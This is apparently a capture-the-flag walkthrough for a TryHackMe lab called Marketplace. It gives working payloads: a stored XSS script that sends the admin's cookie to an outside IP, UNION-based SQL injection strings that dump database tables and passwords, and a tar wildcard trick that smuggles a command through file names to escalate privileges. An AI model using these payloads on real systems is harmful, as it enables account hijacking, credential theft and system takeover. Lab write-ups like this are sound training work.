# The Marketplace

![](https://assets.tryhackme.com/room-banners/marketplace.png)

possible users: michael, jake

## nmap

![](images/nmap.png)

## Sign Up & Login

![](images/signup.png)

## Testing XSS

testing xss
![](images/xss1.png)  
![](images/xss2.png)

## Steal admin token

Make a new listing, change the description to the script, open a netcan listener and then report the listing to the admins
`<script>new Image().src="http://10.11.19.194:1337/cookie.php?output="+document.cookie;</script>`
![](images/cookiesteal.png)
![](images/admintoken.png)

## Hijack admin account

edit token, change it to the admins and refresh
![](images/admin.png)

## Flag 1

flag 1 is in the admin panel
![](images/flag1.png)

## SQL Injection

we can produce an sql error in the admin panel by changing the user id to ' . We can exploit this
![](images/sql.png)

open in burp
![](images/burp.png)

we can deduce that there are 4 columns. 5 gets an error
4 does not
![](images/4columns.png)

show the database schema
`''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,schema_name,0x7C),2,3,4+fRoM+information_schema.schemata--`
![](images/schema.png)

show the tables in the marketplace db
`''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,table_name,0x7c),2,3,4+fRoM+information_schema.tables+wHeRe+table_schema='marketplace'--`
![](images/marketplacedb.png)

show the columns in the messages table
`''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,column_name,0x7C),2,3,4+fRoM++information_schema.columns+wHeRe+table_name='messages'`
![](images/messagetable.png)

user 1 sent user 3 a message with a new SSH password
`''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,':',user_to,':',user_from,':',message_content,0x7C,'\n\n'),2,3,4+fRoM+marketplace.messages`
![](images/user3pass.png)

get the ids by dumping the users table, user 1 is system and user 3 is jake.
`''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,id,':',username,':',password,0x7C,'\n'),2,3,4+fRoM+marketplace.users`
![](images/ids.png)

## SSH

ssh login to the jake user
![](images/ssh.png)

## User Flag

![](images/userf.png)

## PrivEsc

michael can run a shell file called backup.sh as sudo, we can exploit this to get the michael user
![](images/sudo.png)

## Michael

using the below payload in /opt/backups we can make a shell file that will execute upon michael backing up tar files in the directory, giving us a shell (https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

```bash
echo "#!/bin/bash -p" >> shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
sudo -u michael /opt/backups/backup.sh
```

![](images/michael.png)

## Root

michael is in the docker group, meaning we can exploit docker to escalate to root (https://gtfobins.github.io/gtfobins/docker/#shell)
![](images/root.png)

## Root Flag

![](images/rootflag.png)
